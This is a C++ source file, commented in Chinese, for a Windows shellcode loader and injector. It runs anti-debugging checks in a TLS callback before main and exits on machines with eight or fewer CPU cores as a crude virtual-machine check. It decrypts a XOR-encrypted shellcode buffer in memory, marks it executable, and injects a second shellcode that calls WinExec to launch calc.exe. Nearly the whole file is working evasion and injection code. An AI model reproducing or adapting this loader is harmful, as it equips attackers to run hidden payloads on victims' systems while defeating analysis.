//TLSCallBack.cpp
#include "pch.h"
#include "HijackHandle.h"
#include "WorkerFactory.h"
#include "Varient1.h"
#include "comAntiDebug.h"
#define MUTEX_NAME L"Global\\{B6748A47-F1A5-4B23-9781-858927C53290}"

typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)
(
    HANDLE, 
    ULONG, 
    PVOID, 
    ULONG, 
    PULONG
);
#define ProcessDebugPort 7
int IsDebugged()
{
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(hNt, "NtQueryInformationProcess");

    if (!NtQueryInformationProcess)
        return 0;

    ULONG debugPort = 0;
    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessDebugPort,
        &debugPort,
        sizeof(debugPort),
        NULL
    );

    return (debugPort != 0);
}
// 使用 volatile 确保编译器不会过度优化检测标记
static volatile DWORD g_VM_FLAG = 0;

// 待执行的已加密 Shellcode 数组 (XOR 0x83)
unsigned char g_encrypted_buf[] =    
{
   0xE7, 0x22, 0xB3, 0x83, 0x83, 0x83, 0x08, 0xC3, 0x8F, 0x08, 0xC3, 0x97, 0x08, 0x83, 0x08, 0x83,
   0x08, 0xDB, 0x93, 0x08, 0xC8, 0xBF, 0x80, 0x48, 0x00, 0x42, 0x9B, 0x00, 0x42, 0xE3, 0x08, 0x92,
   0x80, 0x50, 0x08, 0xC9, 0xA3, 0x80, 0x48, 0x08, 0xF9, 0x9B, 0xB0, 0x75, 0xB8, 0x74, 0xFE, 0xA1,
   0x08, 0x87, 0x32, 0x80, 0x40, 0x02, 0xBB, 0xC4, 0xE6, 0xF7, 0xD3, 0xF6, 0x91, 0x02, 0xFB, 0x87,
   0xF1, 0xEC, 0xE0, 0xC2, 0xF6, 0x8A, 0x02, 0xFB, 0x8B, 0xE7, 0xE7, 0xF1, 0xE6, 0xF7, 0x85, 0xC5,
   0x68, 0x59, 0xB0, 0x43, 0x40, 0x08, 0xC9, 0xA7, 0x80, 0x48, 0x8C, 0x34, 0x8F, 0xF2, 0x08, 0xC1,
   0x9F, 0x80, 0x40, 0x08, 0x87, 0x0B, 0x80, 0x40, 0xD3, 0xE9, 0x83, 0xEB, 0xE2, 0xF1, 0xFA, 0xC2,
   0xEB, 0xCF, 0xEA, 0xE1, 0xF1, 0xEB, 0xCF, 0xEC, 0xE2, 0xE7, 0x08, 0x7F, 0xD4, 0xD0, 0x7C, 0x53,
   0x00, 0x47, 0x93, 0xDA, 0xD2, 0xE9, 0xEF, 0xEB, 0xEF, 0xAD, 0xE7, 0xEF, 0xEB, 0xEE, 0xFA, 0xE7,
   0xEF, 0x08, 0x7F, 0xD4, 0x7C, 0x53, 0x00, 0x47, 0x8F, 0xDA, 0xEB, 0xE6, 0xF1, 0x83, 0x83, 0xEB,
   0xEF, 0xEC, 0xE2, 0xE7, 0x08, 0x7F, 0xD4, 0xD3, 0x7C, 0x52, 0x00, 0x47, 0x8B, 0x7C, 0x53, 0x40
};
unsigned char g_shellcode[] =
"\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
"\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
"\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2"
"\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01"
"\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48"
"\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41"
"\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8"
"\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24"
"\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B"
"\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48"
"\x01\xDA\x49\x89\xD4\x48\xB9\x57\x69\x6E\x45\x78"
"\x65\x63\x00\x51\x48\x89\xE2\x48\x89\xD9\x48\x83"
"\xEC\x30\x41\xFF\xD4\x48\x83\xC4\x30\x48\x83\xC4"
"\x10\x48\x89\xC6\x48\x89\xF9\x48\x31\xD2\x48\xFF"
"\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
"\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";
const unsigned char xor_key = 0x83;
// 内存加载执行函数
void the_shell_loader()
{
    size_t sc_size = sizeof(g_encrypted_buf);

    // 1. 申请内存 (初始设为可读写 PAGE_READWRITE)
    void* exec_mem = VirtualAlloc(NULL, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) return;

    // 2. 将加密的数据拷贝进去
    memcpy(exec_mem, g_encrypted_buf, sc_size);

    // 3. 在内存中直接进行异或解密
    unsigned char* p_mem = (unsigned char*)exec_mem;
    for (size_t i = 0; i < sc_size; i++)
    {
        p_mem[i] ^= xor_key;
    }
    
    // 4. 修改权限为执行 (PAGE_EXECUTE_READ)
    DWORD oldProtect;
    if (VirtualProtect(exec_mem, sc_size, PAGE_EXECUTE_READ, &oldProtect))
    {
        // 5. 刷新 CPU 指令缓存并执行
        FlushInstructionCache(GetCurrentProcess(), exec_mem, sc_size);

        size_t bufSize = sizeof(g_shellcode);
		BOOL isSuccess = inject(g_shellcode, bufSize);
        
    }

    // 执行完毕后释放内存
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

/* ================= TLS 阶段环境检测 ================= */

//todo
BOOL TLS_AntiDebug()
{
    // 直接使用 Windows API 检测调试器
    if (IsDebuggerPresent()) return TRUE;
    if (IsDebugged()) return TRUE; // 检测到调试器

    return FALSE;
}
// TLS 回调函数：在 main 运行前执行
void NTAPI TLSCallBack(PVOID hModule, DWORD reason, PVOID reserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        // 综合检测：虚拟机、调试器、PEB标志
        if (TLS_AntiDebug())
        {
            g_VM_FLAG = 1;
        }
    }
}

/* ================= TLS 回调配置 (关键) ================= */

#ifdef _WIN64
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:p_tls_callback")
#else
#pragma comment(linker, "/INCLUDE:__tls_used")
#pragma comment(linker, "/INCLUDE:_p_tls_callback")
#endif

// 放入 .CRT$XLB 段确保其在初始化阶段被调用
#pragma const_seg(".CRT$XLB")
EXTERN_C const PIMAGE_TLS_CALLBACK p_tls_callback = TLSCallBack;
#pragma const_seg()



/* ================= 程序主入口 ================= */

int main()
{
  
    // 内存屏障，确保 TLS 的修改对主线程可见
    MemoryBarrier();

    if (g_VM_FLAG)
    {
        wprintf(L"检测到Debug或者VM\n");
        return 0;
    }

    // 创建命名互斥体防止程序多开
    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        wprintf(L"互斥体已在运行\n");
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }
    int cores = GetCpuCores();
    printf("CPU逻辑核心数: %d\n", cores);
    if (cores <= 8)
    {
		printf("CPU核心小于8，可能是虚拟机环境，程序退出.\n");
        return 0;
    }
    wprintf(L"互斥体已创建\n");
	
    //再次确认标志位（防止 OEP 之后被动态修改）
    if (!g_VM_FLAG)
    {

         the_shell_loader();
		printf("Shellcode 执行完毕.\n");
    }



	
	//todo




    if (hMutex)
    {
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }
   
    return 0;
}